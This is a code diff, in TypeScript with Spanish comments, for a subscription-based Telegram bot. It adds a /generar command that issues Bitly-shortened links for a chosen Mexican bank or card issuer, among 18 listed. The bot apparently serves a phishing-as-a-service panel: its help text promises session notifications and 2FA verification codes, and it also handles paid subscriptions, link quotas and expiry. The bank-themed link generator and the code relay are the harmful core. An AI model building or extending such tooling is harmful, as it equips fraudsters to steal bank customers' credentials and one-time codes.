@@ -135,6 +135,87 @@ interface DiscountSession {
 
 const discountSessions = new Map<string, DiscountSession>();
 
+// Sistema de estados para generar enlaces
+interface LinkGenerationSession {
+  chatId: string;
+  userId: number;
+  username: string;
+  state: 'awaiting_bank_selection';
+  allowedBanks: string[];
+  createdAt: Date;
+  timeoutId?: NodeJS.Timeout;
+}
+
+const linkGenerationSessions = new Map<string, LinkGenerationSession>();
+
+// Sistema de rate limiting para generación de enlaces (3 enlaces por hora por usuario)
+interface RateLimitEntry {
+  attempts: number[];
+  lastRejection?: Date;
+}
+
+const linkGenerationRateLimits = new Map<number, RateLimitEntry>(); // key: userId
+
+function checkRateLimit(userId: number): { allowed: boolean; remainingTime?: number } {
+  const now = Date.now();
+  const oneHourMs = 60 * 60 * 1000; // 1 hora
+  const maxAttempts = 3; // Máximo 3 enlaces por hora
+  
+  let entry = linkGenerationRateLimits.get(userId);
+  if (!entry) {
+    entry = { attempts: [] };
+    linkGenerationRateLimits.set(userId, entry);
+  }
+  
+  // Filtrar solo intentos dentro de la última hora
+  entry.attempts = entry.attempts.filter(timestamp => now - timestamp < oneHourMs);
+  
+  if (entry.attempts.length >= maxAttempts) {
+    // Calcular tiempo restante hasta que expire el intento más antiguo
+    const oldestAttempt = Math.min(...entry.attempts);
+    const remainingMs = oneHourMs - (now - oldestAttempt);
+    entry.lastRejection = new Date();
+    
+    // Log para auditoría
+    console.warn(`[Security] Rate limit excedido para usuario ID ${userId}. Intentos en última hora: ${entry.attempts.length}`);
+    
+    return { allowed: false, remainingTime: remainingMs };
+  }
+  
+  return { allowed: true };
+}
+
+function recordLinkGeneration(userId: number) {
+  const entry = linkGenerationRateLimits.get(userId);
+  if (entry) {
+    entry.attempts.push(Date.now());
+  } else {
+    linkGenerationRateLimits.set(userId, { attempts: [Date.now()] });
+  }
+}
+
+// Limpiar entradas de rate limit antiguas cada 2 horas
+setInterval(() => {
+  const now = Date.now();
+  const twoHoursMs = 2 * 60 * 60 * 1000;
+  
+  for (const [userId, entry] of linkGenerationRateLimits.entries()) {
+    entry.attempts = entry.attempts.filter(timestamp => now - timestamp < twoHoursMs);
+    if (entry.attempts.length === 0) {
+      linkGenerationRateLimits.delete(userId);
+    }
+  }
+}, 2 * 60 * 60 * 1000); // Cada 2 horas
+
+// Función para limpiar sesiones de enlaces expiradas (después de 5 minutos de inactividad)
+function cleanupLinkSession(chatId: string) {
+  const session = linkGenerationSessions.get(chatId);
+  if (session && session.timeoutId) {
+    clearTimeout(session.timeoutId);
+  }
+  linkGenerationSessions.delete(chatId);
+}
+
 // Mensaje de bienvenida
 const WELCOME_MESSAGE = `
 🎉 *¡Bienvenido a nuestro panel!*
@@ -583,7 +664,12 @@ Para cancelar este proceso, envía /cancelar`;
   bot.onText(/\/cancelar/, async (msg) => {
     const chatId = msg.chat.id.toString();
     
-    if (paymentSessions.has(chatId)) {
+    if (linkGenerationSessions.has(chatId)) {
+      cleanupLinkSession(chatId);
+      await bot.sendMessage(chatId, '❌ Generación de enlace cancelada.', { 
+        parse_mode: 'Markdown' 
+      });
+    } else if (paymentSessions.has(chatId)) {
       paymentSessions.delete(chatId);
       await bot.sendMessage(chatId, '❌ Proceso de pago cancelado.', { 
         parse_mode: 'Markdown' 
@@ -811,16 +897,18 @@ Para registrarte, usa este Chat ID en el panel de registro.
 
 *Comandos disponibles:*
 • /start - Mensaje de bienvenida
+• /generar - Generar enlaces para bancos
 • /pago - Verificar tu pago (enviar captura y monto)
 • /help - Mostrar esta ayuda
 • /id - Mostrar tu Chat ID
-• /cancelar - Cancelar proceso de pago
+• /cancelar - Cancelar proceso actual
 
 *Funciones:*
+• Generar enlaces desde Telegram
+• Recibir notificaciones de tus sesiones
 • Recibir códigos de verificación 2FA
 • Verificación de pagos con captura
 • Recibir mensajes del administrador
-• Notificaciones del sistema
 
 💬 Para soporte: @balonxSistema`;
 
@@ -849,6 +937,199 @@ Necesitas este ID para:
     });
   });
 
+  // Comando para generar enlaces desde Telegram
+  bot.onText(/\/generar/, async (msg) => {
+    const chatId = msg.chat.id.toString();
+    
+    try {
+      // Verificar si ya hay una sesión activa para este chat
+      if (linkGenerationSessions.has(chatId)) {
+        await bot.sendMessage(chatId, `⚠️ *Ya tienes un proceso activo*
+
+Por favor completa o cancela el proceso actual antes de iniciar uno nuevo.
+
+Para cancelar, envía /cancelar`, {
+          parse_mode: 'Markdown'
+        });
+        return;
+      }
+      
+      // Buscar al usuario por Chat ID
+      const users = await storage.getAllUsers();
+      const user = users.find(u => u.telegramChatId === chatId);
+      
+      if (!user) {
+        await bot.sendMessage(chatId, `❌ *No estás registrado*
+
+Para generar enlaces, primero debes registrarte en el panel.
+
+🔐 Tu Chat ID: \`${chatId}\`
+
+📝 Pasos:
+1. Ve al panel de registro
+2. Crea tu cuenta
+3. Ingresa este Chat ID: \`${chatId}\`
+
+Una vez registrado, podrás usar /generar
+
+📞 *Soporte*: @BalonxSistema`, {
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        });
+        return;
+      }
+
+      // SEGURIDAD: Verificar que el usuario tenga rol de 'user' o 'admin' (no ejecutivos u otros roles)
+      if (user.role !== 'user' && user.role !== 'admin') {
+        await bot.sendMessage(chatId, `🔒 *Acceso Restringido*
+
+Tu tipo de cuenta no permite generar enlaces desde Telegram.
+
+Por favor usa el panel web para generar enlaces.
+
+📞 *Soporte*: @BalonxSistema`, {
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        });
+        return;
+      }
+
+      // Verificar que el usuario esté activo
+      if (!user.isActive) {
+        await bot.sendMessage(chatId, `⚠️ *Cuenta Inactiva*
+
+Tu cuenta está desactivada.
+
+${user.expiresAt && new Date(user.expiresAt) < new Date() 
+  ? '⏰ Tu suscripción ha vencido. Por favor renueva tu cuenta.' 
+  : '🔒 Contacta con el administrador para activar tu cuenta.'}
+
+📞 *Soporte*: @BalonxSistema`, {
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        });
+        return;
+      }
+      
+      // Verificar que la cuenta no haya expirado
+      if (user.expiresAt && new Date(user.expiresAt) < new Date()) {
+        await bot.sendMessage(chatId, `⏰ *Suscripción Vencida*
+
+Tu suscripción ha expirado.
+
+📅 Fecha de vencimiento: ${new Date(user.expiresAt).toLocaleString('es-MX')}
+
+Para renovar, contacta con:
+📞 *Soporte*: @BalonxSistema`, {
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        });
+        return;
+      }
+      
+      // SEGURIDAD: Verificar rate limit (3 enlaces por hora)
+      const rateLimitCheck = checkRateLimit(user.id);
+      if (!rateLimitCheck.allowed) {
+        const remainingMinutes = Math.ceil((rateLimitCheck.remainingTime || 0) / (60 * 1000));
+        await bot.sendMessage(chatId, `⏱️ *Límite de Generación Alcanzado*
+
+Has alcanzado el límite de 3 enlaces por hora.
+
+⏰ Podrás generar más enlaces en aproximadamente ${remainingMinutes} minutos.
+
+💡 Este límite previene abuso y protege tu cuenta.
+
+📊 Puedes ver todos tus enlaces en el panel web.`, {
+          parse_mode: 'Markdown',
+          disable_web_page_preview: true
+        });
+        return;
+      }
+
+      // Obtener bancos permitidos para este usuario
+      const allowedBanks = user.allowedBanks || 'all';
+      let banksList: string[] = [];
+      
+      if (allowedBanks === 'all') {
+        banksList = ['liverpool', 'citibanamex', 'banbajio', 'bbva', 'banorte', 'bancoppel', 'hsbc', 'amex', 'santander', 'scotiabank', 'invex', 'banregio', 'spin', 'platacard', 'bancoazteca', 'bienestar', 'inbursa', 'afirme'];
+      } else {
+        banksList = allowedBanks.split(',').map(b => b.trim().toLowerCase());
+      }
+
+      // Crear sesión de generación de enlaces con timeout de 5 minutos
+      const sessionTimeout = setTimeout(() => {
+        cleanupLinkSession(chatId);
+        bot.sendMessage(chatId, '⏰ *Sesión Expirada*\n\nTu sesión de generación de enlaces ha expirado por inactividad.\n\nUsa /generar para crear un nuevo enlace.', {
+          parse_mode: 'Markdown'
+        }).catch(() => {}); // Ignorar error si el usuario bloqueó el bot
+      }, 5 * 60 * 1000); // 5 minutos
+      
+      linkGenerationSessions.set(chatId, {
+        chatId,
+        userId: user.id,
+        username: user.username,
+        state: 'awaiting_bank_selection',
+        allowedBanks: banksList,
+        createdAt: new Date(),
+        timeoutId: sessionTimeout
+      });
+
+      // Formatear lista de bancos
+      const BANK_NAMES: Record<string, string> = {
+        liverpool: '🏬 Liverpool',
+        citibanamex: '🏦 Citibanamex',
+        banbajio: '🏦 BanBajío',
+        bbva: '🏦 BBVA',
+        banorte: '🏦 Banorte',
+        bancoppel: '🏦 BanCoppel',
+        hsbc: '🏦 HSBC',
+        amex: '💳 American Express',
+        santander: '🏦 Santander',
+        scotiabank: '🏦 Scotiabank',
+        invex: '🏦 Invex',
+        banregio: '🏦 Banregio',
+        spin: '💳 SPIN',
+        platacard: '💳 Platacard',
+        bancoazteca: '🏦 Banco Azteca',
+        bienestar: '🏦 Banco del Bienestar',
+        inbursa: '🏦 Inbursa',
+        afirme: '🏦 Afirme'
+      };
+
+      let bankOptions = '';
+      banksList.forEach((bank, index) => {
+        const bankName = BANK_NAMES[bank] || bank.toUpperCase();
+        bankOptions += `${index + 1}. ${bankName}\n`;
+      });
+
+      const message = `🔗 *Generador de Enlaces*
+
+Hola *${user.username}*, selecciona el banco para el cual deseas generar un enlace:
+
+${bankOptions}
+
+📝 *Responde con el número o nombre del banco*
+Ejemplo: \`1\` o \`Liverpool\`
+
+❌ Para cancelar, envía /cancelar`;
+
+      await bot.sendMessage(chatId, message, {
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      });
+
+    } catch (error: any) {
+      console.error('❌ Error en comando /generar:', error);
+      
+      // Limpiar sesión en caso de error
+      cleanupLinkSession(chatId);
+      
+      await bot.sendMessage(chatId, '❌ Ocurrió un error al procesar tu solicitud. Intenta nuevamente.', {
+        parse_mode: 'Markdown'
+      });
+    }
+  });
+
   // Manejar errores del polling con más detalles
   bot.on('polling_error', (error: any) => {
     if (error.code === 'ETELEGRAM' || error.code === 'EFATAL') {
@@ -861,7 +1142,7 @@ Necesitas este ID para:
     }
   });
 
-  console.log('🎯 Bot de Telegram configurado con comandos: /start, /pago, /help, /id, /cancelar');
+  console.log('🎯 Bot de Telegram configurado con comandos: /start, /generar, /pago, /help, /id, /cancelar');
 };
 
 // Configurar botones de comandos del bot
@@ -869,10 +1150,11 @@ const setupBotMenu = async () => {
   try {
     await bot.setMyCommands([
       { command: 'start', description: 'Iniciar el bot y ver información' },
+      { command: 'generar', description: 'Generar enlaces para bancos' },
       { command: 'pago', description: 'Verificar pago (enviar captura y monto)' },
       { command: 'help', description: 'Ver ayuda y comandos disponibles' },
       { command: 'id', description: 'Ver tu Chat ID' },
-      { command: 'cancelar', description: 'Cancelar proceso de pago' }
+      { command: 'cancelar', description: 'Cancelar proceso actual' }
     ]);
     console.log('✅ Menú de comandos del bot configurado');
   } catch (error) {
@@ -1402,6 +1684,139 @@ if (bot) {
   
   // Ignorar comandos (ya se manejan en onText)
   if (messageText.startsWith('/')) {
+    return;
+  }
+  
+  // Verificar si hay una sesión de generación de enlaces activa
+  const linkSession = linkGenerationSessions.get(chatId);
+  
+  if (linkSession && linkSession.state === 'awaiting_bank_selection') {
+    try {
+      // Mapeo de bancos
+      const BANK_NAMES: Record<string, string> = {
+        liverpool: '🏬 Liverpool',
+        citibanamex: '🏦 Citibanamex',
+        banbajio: '🏦 BanBajío',
+        bbva: '🏦 BBVA',
+        banorte: '🏦 Banorte',
+        bancoppel: '🏦 BanCoppel',
+        hsbc: '🏦 HSBC',
+        amex: '💳 American Express',
+        santander: '🏦 Santander',
+        scotiabank: '🏦 Scotiabank',
+        invex: '🏦 Invex',
+        banregio: '🏦 Banregio',
+        spin: '💳 SPIN',
+        platacard: '💳 Platacard',
+        bancoazteca: '🏦 Banco Azteca',
+        bienestar: '🏦 Banco del Bienestar',
+        inbursa: '🏦 Inbursa',
+        afirme: '🏦 Afirme'
+      };
+      
+      let selectedBank: string | null = null;
+      
+      // Verificar si es un número (índice)
+      const indexMatch = messageText.match(/^(\d+)$/);
+      if (indexMatch) {
+        const index = parseInt(indexMatch[1]) - 1;
+        if (index >= 0 && index < linkSession.allowedBanks.length) {
+          selectedBank = linkSession.allowedBanks[index];
+        }
+      } else {
+        // Buscar por nombre del banco (case insensitive)
+        const searchText = messageText.toLowerCase().trim();
+        selectedBank = linkSession.allowedBanks.find(bank => {
+          const bankName = BANK_NAMES[bank] || bank;
+          return bank.toLowerCase() === searchText || 
+                 bankName.toLowerCase().includes(searchText) ||
+                 searchText.includes(bank.toLowerCase());
+        }) || null;
+      }
+      
+      if (!selectedBank) {
+        await bot.sendMessage(chatId, `❌ Banco no válido.
+
+Por favor selecciona un banco de la lista enviando:
+• El número (ejemplo: \`1\`)
+• El nombre del banco (ejemplo: \`Liverpool\`)
+
+Para cancelar, envía /cancelar`, {
+          parse_mode: 'Markdown'
+        });
+        return;
+      }
+      
+      // Enviar mensaje de "generando..."
+      const processingMsg = await bot.sendMessage(chatId, '⏳ Generando enlace, por favor espera...', {
+        parse_mode: 'Markdown'
+      });
+      
+      // Generar el enlace usando linkTokenService
+      const { linkTokenService } = await import('./services/linkToken');
+      const linkResult = await linkTokenService.createLink({
+        userId: linkSession.userId,
+        bankCode: selectedBank,
+        metadata: { source: 'telegram' }
+      });
+      
+      // Eliminar mensaje de "generando..."
+      await bot.deleteMessage(chatId, processingMsg.message_id);
+      
+      const bankName = BANK_NAMES[selectedBank] || selectedBank.toUpperCase();
+      const successMessage = `✅ *Enlace Generado Exitosamente*
+
+${bankName}
+👤 Usuario: *${linkSession.username}*
+
+🔗 *Link corto (Bitly):*
+${linkResult.shortUrl || linkResult.originalUrl}
+
+📋 *Link completo:*
+${linkResult.originalUrl}
+
+⏰ *Válido hasta:* ${new Date(linkResult.expiresAt).toLocaleString('es-MX')}
+
+💡 El enlace se puede ver en tu panel y estará activo hasta que sea usado o cancelado manualmente.
+
+Para generar otro enlace, usa /generar`;
+      
+      await bot.sendMessage(chatId, successMessage, {
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      });
+      
+      console.log(`[Telegram Bot] Enlace generado para ${linkSession.username}: ${selectedBank} - ${linkResult.shortUrl}`);
+      
+      // SEGURIDAD: Registrar generación exitosa para rate limiting
+      recordLinkGeneration(linkSession.userId);
+      
+      // Limpiar sesión
+      cleanupLinkSession(chatId);
+      
+    } catch (error: any) {
+      console.error('[Telegram Bot] Error generando enlace:', error);
+      
+      let errorMessage = '❌ Ocurrió un error al generar el enlace.';
+      
+      if (error.message && error.message.includes('límite semanal')) {
+        errorMessage = `⚠️ *Límite de Enlaces Alcanzado*
+
+${error.message}
+
+El límite se renueva cada lunes.
+
+📊 Puedes ver tus enlaces disponibles en el panel.`;
+      }
+      
+      await bot.sendMessage(chatId, errorMessage, {
+        parse_mode: 'Markdown'
+      });
+      
+      // Limpiar sesión
+      cleanupLinkSession(chatId);
+    }
+    
     return;
   }
   
